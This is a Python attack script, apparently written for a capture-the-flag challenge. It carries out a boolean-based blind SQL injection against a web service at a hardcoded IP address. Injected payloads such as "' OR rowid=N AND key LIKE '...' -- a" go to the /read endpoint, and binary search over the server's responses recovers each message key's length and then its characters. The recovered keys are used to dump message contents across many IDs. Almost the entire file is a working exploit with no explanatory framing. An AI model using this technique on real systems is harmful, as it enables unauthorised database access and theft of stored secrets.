import requests
import string
from bs4 import BeautifulSoup
import lxml

url = 'http://51.68.174.216:47024'
read = '/read'


def try_pas(id, pas):
    r = requests.post(url + read, data={'mid': str(id), 'key': pas})
    bad = 'Message not found for ID/Key pair'
    return (not (bad in r.text)), r.text


def post_inj(id, pas):
    injbeg = "' OR rowid=" + str(id) + " AND key LIKE '"
    injend = "' -- a"
    return try_pas(id, injbeg + pas + injend)[0]


def post_inj_less(id, pas):
    injbeg = "' OR rowid=" + str(id) + " AND key >= '"
    injend = "' -- a"
    return try_pas(id, injbeg + pas + injend)[0]


def guess_len(id):
    l, r = 0, 1000
    while l < r - 1:
        m = (l + r) // 2
        pas = '_' * m + '%'
        if post_inj(id, pas):
            l = m
        else:
            r = m
    return l


def get_message(id, pas):
    r = requests.post(url + read, data={'mid': str(id), 'key': pas})
    return r.text


def crack_message(id):
    len = guess_len(id)
    pas = ''
    for i in range(len):
        l, r = 32, 127
        while l < r - 1:
            m = (l + r) // 2
            c = chr(m)
            if post_inj_less(id, pas + c):
                l = m
            else:
                r = m
        pas = pas + chr(l)
    print(id, pas)
    return pas
# print(post_inj(1, '$ecretpasswordornot?'))
for i in range(1, 10000):
    if not post_inj(i, '%'):
        print(i, 'BREED')
        break
    pas = crack_message(i)
    # pas = '$ecretPasswordOrNot?'
    soup = BeautifulSoup(try_pas(i, pas)[1], 'lxml')
    print(soup.p.text)

# print(get_message(1, '$ecretpasswordornot?'))